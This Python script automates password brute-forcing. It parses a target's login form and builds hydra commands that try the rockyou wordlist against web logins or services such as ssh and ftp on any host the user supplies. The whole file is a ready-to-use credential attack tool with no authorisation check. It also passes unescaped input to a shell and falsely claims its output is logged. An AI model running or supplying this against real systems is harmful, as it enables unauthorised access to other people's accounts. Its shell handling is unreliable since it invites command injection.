#!/usr/bin/env python3
import os
import subprocess
import sys
import datetime
import re
from urllib.parse import urlparse, urljoin

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    print("Please install required packages: requests, beautifulsoup4")
    print("Run: sudo apt install python3-requests python3-bs4")
    sys.exit(1)

# Colors for terminal output
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
RESET = "\033[0m"

DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"

def print_colored(text, color):
    print(f"{color}{text}{RESET}")

def run_command(cmd, description):
    print_colored(f"\n[+] {description}", CYAN)
    try:
        subprocess.run(cmd, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print_colored(f"Command failed: {e}", RED)

def fetch_login_page(url):
    print_colored(f"Fetching login page: {url}", GREEN)
    try:
        response = requests.get(url, timeout=15)
        response.raise_for_status()
        return response.text
    except Exception as e:
        print_colored(f"Failed to fetch login page: {e}", RED)
        return None

def analyze_login_page(html, base_url):
    soup = BeautifulSoup(html, "html.parser")
    
    # Try to find form
    form = soup.find("form")
    if not form:
        print_colored("No <form> tag found - might be JS login. You will need to enter parameters manually.", YELLOW)
        return None
    
    # Determine form action URL
    action = form.get("action")
    if not action:
        action = base_url
    elif not action.startswith("http"):
        action = urljoin(base_url, action)

    # Find input fields for username and password
    username_field = None
    password_field = None
    for inp in form.find_all("input"):
        input_type = inp.get("type", "").lower()
        name = inp.get("name", "")
        if input_type == "password" and not password_field:
            password_field = name
        if input_type in ["text", "email"] and not username_field:
            username_field = name
    
    print_colored(f"Form action URL: {action}", CYAN)
    print_colored(f"Detected username field: {username_field}", CYAN)
    print_colored(f"Detected password field: {password_field}", CYAN)
    
    # Try to detect failure message - look for alerts or keywords in html
    failure_msgs = set()
    failure_pattern = re.compile(r"alert\(['\"](.+?)['\"]\)", re.IGNORECASE)
    alerts = failure_pattern.findall(html)
    for alert in alerts:
        failure_msgs.add(alert.lower())
    
    # Common failure keywords in the page text
    common_failures = ["invalid", "failed", "incorrect", "error", "denied", "unauthorized", "wrong"]
    page_text = html.lower()
    for keyword in common_failures:
        if keyword in page_text:
            failure_msgs.add(keyword)
    
    failure_msg = None
    if failure_msgs:
        failure_msg = list(failure_msgs)[0]
    print_colored(f"Suggested failure message (case sensitive): {failure_msg}", CYAN)
    
    return {
        "action": action,
        "username_field": username_field,
        "password_field": password_field,
        "failure_msg": failure_msg
    }

def get_input(prompt, default=None):
    if default:
        prompt = f"{prompt} [{default}]: "
    else:
        prompt = f"{prompt}: "
    inp = input(prompt).strip()
    if not inp and default is not None:
        return default
    return inp

def main():
    print_colored("=== Password Cracking Automation ===", GREEN)
    
    # Check hydra installed
    if not shutil.which("hydra"):
        print_colored("Hydra is not installed or not in PATH. Install it first.", RED)
        sys.exit(1)
    
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    logdir = f"password_crack_{timestamp}"
    os.makedirs(logdir, exist_ok=True)
    print_colored(f"Logs will be saved to: {logdir}", GREEN)
    
    # Choose service type
    print("Choose cracking mode:")
    print("1) Web login brute force")
    print("2) Other services brute force (ssh, ftp, etc.)")
    choice = get_input("Enter choice (1 or 2)", "1")
    if choice not in ["1", "2"]:
        print_colored("Invalid choice.", RED)
        sys.exit(1)

    wordlist = get_input("Enter path to wordlist (leave empty for default rockyou)")
    if not wordlist:
        wordlist = DEFAULT_WORDLIST
    if not os.path.isfile(wordlist):
        print_colored(f"Wordlist '{wordlist}' not found.", RED)
        sys.exit(1)

    if choice == "1":
        login_url = get_input("Enter full login page URL (e.g. http://192.168.1.1/index.html)")
        if not login_url.startswith("http"):
            print_colored("Invalid URL, must start with http or https.", RED)
            sys.exit(1)
        
        page_html = fetch_login_page(login_url)
        if not page_html:
            print_colored("Failed to fetch or parse login page.", RED)
            sys.exit(1)
        
        form_info = analyze_login_page(page_html, login_url)
        if not form_info:
            # Manual entry fallback
            form_info = {}
            form_info["action"] = get_input("Enter form action URL", login_url)
            form_info["username_field"] = get_input("Enter username field name")
            form_info["password_field"] = get_input("Enter password field name")
            form_info["failure_msg"] = get_input("Enter failure detection string")
            if not all(form_info.values()):
                print_colored("All fields required. Exiting.", RED)
                sys.exit(1)
        
        usernames = get_input("Enter usernames (comma separated)", "admin")
        username_list = [u.strip() for u in usernames.split(",")]
        
        parsed_url = urlparse(form_info["action"])
        host = parsed_url.netloc
        path = parsed_url.path or "/"
        if parsed_url.query:
            path += "?" + parsed_url.query
        port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
        
        for user in username_list:
            hydra_cmd = (
                f'hydra -l {user} -P "{wordlist}" -s {port} {host} http-post-form '
                f'"{path}:{form_info["username_field"]}=^USER^&{form_info["password_field"]}=^PASS^:{form_info["failure_msg"]}"'
            )
            logfile = os.path.join(logdir, f"hydra_web_{user}.log")
            print_colored(f"\nRunning hydra for user '{user}'...", CYAN)
            run_command(hydra_cmd, f"Hydra web brute force for user '{user}' (log saved to {logfile})")
            
    else:
        service = get_input("Enter service to attack (e.g., ssh, ftp)")
        target = get_input("Enter target IP or domain")
        username = get_input("Enter username (leave empty for 'admin')", "admin")
        port = get_input("Enter port (leave empty for default)")
        port_arg = f"-s {port}" if port else ""
        
        hydra_cmd = f"hydra -l {username} -P \"{wordlist}\" {port_arg} {target} {service}"
        logfile = os.path.join(logdir, f"hydra_{service}.log")
        print_colored(f"\nRunning hydra for {service} on {target}...", CYAN)
        run_command(hydra_cmd, f"Hydra brute force on {service} at {target} (log saved to {logfile})")

    print_colored("\n[✓] Password cracking session completed.", GREEN)

if __name__ == "__main__":
    import shutil
    main()
